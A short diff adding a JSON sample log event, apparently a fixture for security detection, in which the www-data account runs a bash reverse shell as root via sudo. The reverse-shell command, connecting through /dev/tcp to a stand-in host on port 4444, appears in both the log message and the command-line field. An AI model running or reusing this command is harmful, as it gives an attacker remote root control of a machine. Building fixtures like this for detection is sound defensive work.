@@ -1,0 +1,11 @@
+{
+  "source": "log",
+  "log_ident": "sudo",
+  "log_msg": "    www-data : TTY=pts/0 ; PWD=/home/www-data ; USER=root ; COMMAND=/bin/bash -c bash -i >& /dev/tcp/203.0.113.7/4444 0>&1",
+  "user": {
+    "name": "www-data"
+  },
+  "process": {
+    "cmdline": "/bin/bash -c bash -i >& /dev/tcp/203.0.113.7/4444 0>&1"
+  }
+}
